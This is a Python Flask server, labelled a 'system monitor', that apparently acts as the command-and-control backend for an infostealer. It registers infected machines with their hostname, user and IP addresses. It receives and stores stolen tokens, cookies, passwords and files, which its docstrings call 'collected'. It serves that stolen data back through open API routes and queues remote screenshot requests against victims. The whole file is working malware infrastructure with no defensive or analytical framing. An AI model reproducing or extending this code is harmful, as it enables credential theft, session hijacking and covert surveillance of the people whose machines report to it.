#!/usr/bin/env python3
"""
LEALDADE SYSTEM MONITOR - VERSÃO CORRIGIDA PARA RAILWAY
Servidor robusto sem dependências problemáticas
"""

import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)

# Carregar template HTML
try:
    template_path = os.path.join(os.path.dirname(__file__), 'templates', 'index.html')
    with open(template_path, 'r', encoding='utf-8') as f:
        HTML_TEMPLATE = f.read()
except FileNotFoundError:
    HTML_TEMPLATE = "<h1>Template não encontrado</h1>"

# CORS manual
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

# Dados em memoria
endpoints = {}
metrics_data = []
endpoint_screenshots = {}
screenshot_requests = {}
endpoint_tokens = {}
endpoint_cookies = {}
endpoint_passwords = {}
endpoint_files = {}
full_reports = {}
uploaded_files = {}

# API Endpoints robustos
@app.route('/login')
def login():
    """Página de login"""
    try:
        template_path = os.path.join(os.path.dirname(__file__), 'templates', 'login.html')
        with open(template_path, 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "<h1>Página de login não encontrada</h1>", 404

@app.route('/')
def index():
    """Página principal"""
    return HTML_TEMPLATE

@app.route('/api/register', methods=['POST', 'OPTIONS'])
def register_endpoint():
    """Registra novo endpoint"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', 'Unknown'),
            'external_ip': data.get('external_ip', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'status': 'online',
            'last_seen': datetime.now().isoformat(),
            'registered_at': datetime.now().isoformat()
        }
        
        print(f"[API] Endpoint registrado: {endpoint_id}")
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao registrar endpoint: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tokens_data')
def get_tokens_data():
    """Retorna todos os tokens coletados"""
    return jsonify(endpoint_tokens)

@app.route('/api/cookies_data')
def get_cookies_data():
    """Retorna todos os cookies coletados"""
    return jsonify(endpoint_cookies)

@app.route('/api/passwords_data')
def get_passwords_data():
    """Retorna todas as senhas coletadas"""
    return jsonify(endpoint_passwords)

@app.route('/api/files_data')
def get_files_data():
    """Retorna todos os arquivos recebidos"""
    return jsonify(endpoint_files)

@app.route('/api/metrics_data')
def get_metrics_data():
    """Retorna todas as métricas"""
    return jsonify(metrics_data)

@app.route('/api/tokens', methods=['POST'])
def receive_tokens():
    """Recebe tokens de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        tokens = data.get('tokens', [])
        
        if endpoint_id:
            endpoint_tokens[endpoint_id] = {
                'tokens': tokens,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Tokens recebidos: {endpoint_id} - {len(tokens)} tokens")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber tokens: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/cookies', methods=['POST'])
def receive_cookies():
    """Recebe cookies de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        cookies = data.get('cookies', [])
        
        if endpoint_id:
            endpoint_cookies[endpoint_id] = {
                'cookies': cookies,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Cookies recebidos: {endpoint_id} - {len(cookies)} cookies")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber cookies: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/passwords', methods=['POST'])
def receive_passwords():
    """Recebe senhas de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        passwords = data.get('passwords', [])
        
        if endpoint_id:
            endpoint_passwords[endpoint_id] = {
                'passwords': passwords,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Senhas recebidas: {endpoint_id} - {len(passwords)} senhas")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber senhas: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/files', methods=['POST'])
def receive_files():
    """Recebe arquivos de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        files = data.get('files', [])
        
        if endpoint_id:
            endpoint_files[endpoint_id] = {
                'files': files,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Arquivos recebidos: {endpoint_id} - {len(files)} arquivos")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber arquivos: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/metrics', methods=['POST'])
def receive_metrics():
    """Recebe métricas de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        metrics = data.get('metrics', {})
        
        if endpoint_id:
            metrics_data.append({
                'endpoint_id': endpoint_id,
                'metrics': metrics,
                'timestamp': datetime.now().isoformat()
            })
            print(f"[API] Métricas recebidas: {endpoint_id}")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber métricas: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST'])
def request_screenshot(endpoint_id):
    """Solicita screenshot de um endpoint específico"""
    try:
        if endpoint_id not in screenshot_requests:
            screenshot_requests[endpoint_id] = {
                'request_screenshot': True,
                'timestamp': datetime.now().isoformat()
            }
        print(f"[API] Screenshot solicitado: {endpoint_id}")
        return jsonify({'status': 'success', 'message': f'Screenshot solicitado para {endpoint_id}'})
    except Exception as e:
        print(f"[API] Erro ao solicitar screenshot: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>')
def check_screenshot_request(endpoint_id):
    """Verifica se há solicitação de screenshot"""
    if endpoint_id in screenshot_requests:
        return jsonify(screenshot_requests[endpoint_id])
    else:
        return jsonify({'request_screenshot': False})

@app.route('/api/screenshots')
def get_screenshots():
    """Retorna todos os screenshots"""
    return jsonify(endpoint_screenshots)

@app.route('/api/heartbeat', methods=['POST'])
def receive_heartbeat():
    """Recebe heartbeat de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        status = data.get('status', 'unknown')
        
        if endpoint_id in endpoints:
            endpoints[endpoint_id]['last_seen'] = datetime.now().isoformat()
            endpoints[endpoint_id]['status'] = status
        
        print(f"[API] Heartbeat recebido: {endpoint_id} - {status}")
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber heartbeat: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/endpoints')
def list_endpoints():
    """Lista todos os endpoints"""
    try:
        endpoints_list = []
        for ep_id, data in endpoints.items():
            endpoints_list.append({
                'id': ep_id,
                'status': data.get('status', 'unknown'),
                'last_seen': data.get('last_seen', ''),
                'hostname': data.get('hostname', ''),
                'user': data.get('user', ''),
                'ip_address': data.get('ip_address', ''),
                'external_ip': data.get('external_ip', ''),
                'platform': data.get('platform', ''),
                'ram': data.get('ram', ''),
                'registered_at': data.get('registered_at', '')
            })
        
        return jsonify(endpoints_list)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    print("🚀 Iniciando System Monitor CORRIGIDO para Railway...")
    print("📡 Servidor robusto sem dependências problemáticas")
    print("🌐 URL: https://web-production-49d37.up.railway.app")
    print()
    
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
